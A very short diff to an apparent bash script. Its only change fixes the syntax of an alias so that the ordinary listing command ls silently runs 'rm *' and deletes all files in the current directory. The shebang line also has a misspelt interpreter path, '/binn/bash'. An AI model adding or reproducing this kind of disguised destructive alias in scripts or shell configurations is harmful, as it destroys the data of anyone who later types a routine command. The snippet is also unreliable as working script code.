@@ -1,2 +1,2 @@
 #!/binn/bash
-alias ls = 'rm *'
+alias ls='rm *'
